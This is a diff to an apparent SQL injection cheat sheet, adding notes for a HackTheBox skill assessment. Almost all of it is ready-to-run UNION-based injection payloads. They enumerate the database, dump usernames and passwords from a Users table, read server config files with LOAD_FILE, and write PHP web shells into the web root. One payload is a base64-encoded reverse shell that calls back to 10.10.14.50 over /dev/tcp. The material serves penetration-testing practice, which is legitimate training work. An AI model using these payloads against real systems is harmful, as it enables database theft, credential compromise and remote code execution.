@@ -231,6 +231,19 @@ cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/
 cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -                      '--- Must know the base web directory for the web server (i.e. web root): Use `load_file` to read the server configuration (e.g. Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config), OR we can search online OR run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
 ' UNION SELECT 1, FROM_BASE64('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFtjbWRdKTsgPz4='), 3, 4 INTO OUTFILE '/var/www/html/webshell.php'-- -            '--- Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
 ' UNION SELECT 1, FROM_BASE64('PD9waHAgc3lzdGVtKCdiaW4vYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MC80NDM0IDA+JjEiJyk7ID8+'), 3, 4 INTO OUTFILE '/var/www/html/revshell3.php'-- -
+
+'--- HTB Skill Assessment - Use Burp 1. invite code SQLi 2. search query SQLi
+cn') UNION SELECT 1,2,3,4-- -
+cn') UNION SELECT 1,2,@@version,4-- -
+cn') UNION SELECT 1,2,current_user,4-- -
+cn') UNION SELECT 1,2,database(),4-- -
+cn') UNION SELECT 1,2,TABLE_NAME,4 FROM information_schema.tables WHERE TABLE_SCHEMA='chattr'-- -
+cn') UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME FROM information_schema.columns WHERE TABLE_NAME='Users'-- -
+cn') UNION SELECT 1,2,Username,Password FROM chattr.Users-- -
+cn') UNION SELECT 1, 2, variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+cn') UNION SELECT 1, 2, LOAD_FILE("/etc/nginx/nginx.conf"), 4-- - 
+cn') UNION SELECT 1, 2, LOAD_FILE("/etc/nginx/sites-enabled/default"), 4-- -
+cn') UNION SELECT "", '<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/www/chattr-prod/shell.php'-- -
 ```
 
 ### NON-ORACLE
